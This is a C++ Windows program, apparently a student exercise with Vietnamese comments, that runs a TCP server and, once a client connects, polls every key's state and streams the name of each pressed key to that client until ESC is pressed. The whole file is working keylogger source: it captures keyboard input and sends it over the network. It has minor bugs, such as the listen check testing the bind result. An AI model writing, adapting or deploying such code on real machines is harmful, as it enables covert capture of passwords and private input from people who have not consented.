// g++ *.cpp -o server.exe -lgdi32 -lws2_32; ./server

// vector<string> --> string --> const char*

const int BUFFER_SIZE = 1024;
# define MAX_LEN 5350000
#include <cstdio>
#include <winsock2.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>

using namespace std;

// Hàm gửi dữ liệu bằng socket
bool send_data(SOCKET &socket, const char* data, int size) {
    cout << data << "\n";
    send(socket, reinterpret_cast<char*>(&size), sizeof(int), 0);

    int total_sent = 0;
    while (total_sent < size) {
        int sent = send(socket, data + total_sent, size - total_sent, 0);
        if (sent == -1) {
            continue;
            // std::cerr << "Error sending data\n";
            // return false;
        }
        total_sent += sent;
    }
    cout << "Total send: " << total_sent << "/" << size << "\n";
    return true;
}

// VirtualKeyCode --> String
std::string VirtualKeyCodeToString(UCHAR virtualKey)
{
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

    CHAR szName[128];
    int result = 0;
    switch (virtualKey)
    {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_RCONTROL: case VK_RMENU:
        case VK_LWIN: case VK_RWIN: case VK_APPS:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK:
            scanCode |= KF_EXTENDED;
        default:
            result = GetKeyNameTextA(scanCode << 16, szName, 128);
    }
    if(result == 0)
        throw std::system_error(std::error_code(GetLastError(), std::system_category()),
                                "WinAPI Error occured.");
    return szName;
}

void catchKeyDown(SOCKET &socket) {

    while (true)
    {
        // Duyệt qua tất cả các mã phím ảo từ 0x01 đến 0xFE
        // for (int vk = 0x01; vk <= 0xFE; vk++)
        for (int vk = 0x08; vk <= 0xFE; vk++) // bỏ qua click chuột
        {
            // Kiểm tra xem phím có được nhấn hay không
            if (GetAsyncKeyState(vk) & 0x8000)
            {
                // std::cout << "You pressed key code " << vk << "\n";
                string s = VirtualKeyCodeToString(vk);
                // std::cout << "You pressed key code: " << vk << " --> " << s << "\n";

                const char* s_cc = s.c_str();
                send_data(socket, s_cc, strlen(s_cc));
            }
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000)
        {
            std::cout << "You pressed ESC\n";
            break; // Thoát khỏi vòng lặp
        }

        // Sleep(100);
    }
}

void ServerSocket() {
    // Set up WSA
    WORD verRequested = MAKEWORD(2, 2);
    WSADATA wsaData;

    int wsaErr = WSAStartup(verRequested, &wsaData);
    if (wsaErr != 0) {
        printf("WSAStartup fail - error: %d", wsaErr);
        exit(-1);
    }
    else
        printf("WSAStartup success - status: %s\n", wsaData.szSystemStatus);

    // Create server socket
    SOCKET m_socket;
    m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_socket == INVALID_SOCKET) {
        printf("socket fail - error: ", WSAGetLastError());
        WSACleanup();
        exit(-2);
    }
    else
        printf("socket success\n");

    // Bind server socket
    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = inet_addr("127.0.1.1");
    service.sin_port = htons(12345); // [1024;49151]

    int bindErr = bind(m_socket, (SOCKADDR *)&service, sizeof(service));
    if (bindErr != 0) {
        printf("bind fail - error: %d", WSAGetLastError());
        closesocket(m_socket);
        WSACleanup();
        exit(-3);
    }
    else
        printf("bind success\n");

    // Listen to Client request
    int listenErr = listen(m_socket, 1);
    if (bindErr != 0) {
        printf("listen fail - error: %d", WSAGetLastError());
        closesocket(m_socket);
        WSACleanup();
        exit(-4);
    }
    else
        printf("listen success\n");

    printf("Server is waiting for Client...\n");

    // Connect Client
    SOCKET ac_socket;

    // --------- CONNECT CLIENT: START -------------
    // Connect accept socket (with 1 Client)
    ac_socket = accept(m_socket, NULL, NULL);
    if (ac_socket == INVALID_SOCKET) {
        printf("conect fail - error: %d", WSAGetLastError());
        closesocket(m_socket);
        WSACleanup();
        exit(-5);
    }
    else
        printf("connect success\n");

    // Do something with Client
    catchKeyDown(ac_socket);
   
    // Close accept socket (with 1 Client)
    closesocket(ac_socket);
    printf("Close ac_socket\n");
    // --------- CONNECT CLIENT: FINISH -------------

    // Close server socket
    closesocket(m_socket);
    printf("Close m_socket\n");
    WSACleanup();
}

int main() {
    ServerSocket();
    
    return 0;
}